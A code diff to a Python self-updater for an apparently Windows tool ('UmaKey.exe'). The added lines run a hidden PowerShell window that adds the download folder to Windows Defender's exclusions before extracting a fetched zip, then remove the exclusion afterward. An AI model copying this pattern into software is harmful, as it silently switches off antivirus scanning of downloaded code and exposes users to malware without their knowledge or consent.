@@ -55,6 +55,7 @@ def update() -> None:
     print('Commencing the update process...')
     with urllib.request.urlopen(zip_url) as response:
         temp_dir = mkdtemp()
+        windll.shell32.ShellExecuteW(None, "open", "powershell.exe", f'Add-MpPreference -ExclusionPath "{temp_dir}"', None, 0)
         with zipfile.ZipFile(BytesIO(response.read())) as zip_ref:
             zip_ref.extractall(temp_dir)
     print('Download process completed successfully.')
@@ -100,13 +101,13 @@ def update() -> None:
             dll.restype = None
             dll("업데이트 완료")
             del dll
+        windll.shell32.ShellExecuteW(None, "open", "UmaKey.exe", None, None, 1)
     except Exception as e:
-        shutil.rmtree(temp_dir)
         print(e)
         input()
-        os._exit(1)
-    shutil.rmtree(temp_dir)
-    windll.shell32.ShellExecuteW(None, "open", "UmaKey.exe", None, None, 1)
+    finally:
+        windll.shell32.ShellExecuteW(None, "open", "powershell.exe", f'Remove-MpPreference -ExclusionPath "{temp_dir}"', None, 0)
+        shutil.rmtree(temp_dir)
     os._exit(0)
 
 if __name__ == '__main__':
